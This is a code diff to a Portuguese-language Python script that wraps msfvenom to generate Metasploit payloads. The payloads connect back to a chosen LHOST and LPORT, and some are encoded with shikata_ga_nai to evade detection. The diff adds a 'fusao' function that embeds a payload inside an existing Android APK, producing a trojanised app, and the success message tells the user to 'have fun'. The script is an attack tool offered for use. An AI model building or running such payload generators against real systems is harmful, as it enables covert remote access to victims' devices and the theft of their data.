@@ -71,7 +71,7 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}')
         else:
-            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
         exit()
 
     if tipo == t7 or tipo == t9 or tipo == 8:
@@ -85,7 +85,7 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}')
         else:
-            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
         exit()
     
     if tipo == t6:
@@ -99,7 +99,7 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}')
         else:
-            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
         exit()
 
 
@@ -110,7 +110,7 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}')
         else:
-            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
     else:
         payload = system(f'msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} > {local}{nome}.{form}')
         if payload == 1:
@@ -119,8 +119,11 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} >'
                   f' {local}{nome}.{form}')
         else:
-            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
     exit()
 
 
-diretorio()
+def fusao(nome, origem, ip='127.0.0.1', port='4444', local='Payloads/', payload=t11):
+    tmp = system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -x {origem} -o {local}{nome}.apk")
+
+
